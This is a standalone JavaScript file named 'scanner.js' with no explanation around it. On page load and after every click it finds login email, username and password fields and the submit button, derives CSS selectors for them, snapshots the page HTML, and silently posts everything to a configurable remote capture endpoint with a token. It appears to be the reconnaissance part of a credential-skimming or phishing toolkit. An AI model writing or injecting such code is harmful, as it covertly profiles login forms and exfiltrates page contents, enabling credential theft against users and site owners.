// scanner.js
(function(){
  function fingerprintAndSend(){
    try{
      const email = document.querySelector("input[type='email'], input[placeholder*='e-mail'], input[placeholder*='Email'], input[name*='user'], input[name*='email']");
      const password = document.querySelector("input[type='password'], input[placeholder*='senha'], input[name*='password']");
      const submit = document.querySelector("button[type='submit'], input[type='submit']");
      const payload = {
        url: location.href,
        timestamp: Date.now(),
        email_selector: email ? selectorFor(email) : null,
        password_selector: password ? selectorFor(password) : null,
        submit_selector: submit ? selectorFor(submit) : null,
        html_snapshot: document.documentElement.innerHTML.slice(0, 200000)
      };
      fetch(window.NEXUS_CAPTURE_URL || "/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Nexus-Token": window.NEXUS_CAPTURE_TOKEN || ""
        },
        body: JSON.stringify(payload)
      }).then(r=>console.log("capture sent", r.status)).catch(e=>console.error(e));
    }catch(e){
      console.error("scanner error", e);
    }
  }

  function selectorFor(el){
    if(!el) return null;
    if(el.id) return `#${CSSescape(el.id)}`;
    if(el.name) return `${el.tagName.toLowerCase()}[name="${el.name}"]`;
    if(el.placeholder) return `${el.tagName.toLowerCase()}[placeholder="${el.placeholder}"]`;
    return pathTo(el);
  }

  function CSSescape(s){ return s.replace(/([ #;?%&,.+*~\':"!^$[\]()=>|\/@])/g,'\\\\$1'); }
  function pathTo(el){
    const parts=[];
    while(el && el.nodeType===1 && el.tagName!=='HTML'){
      let n = el.tagName.toLowerCase();
      if(el.className){
        const c = (el.className||"").split(/\s+/)[0];
        if(c) n += `.${c}`;
      }
      parts.unshift(n);
      el = el.parentElement;
    }
    return parts.join(">");
  }

  window.addEventListener("load", ()=>setTimeout(fingerprintAndSend, 1200));
  document.addEventListener("click", ()=>setTimeout(fingerprintAndSend, 600));
})();
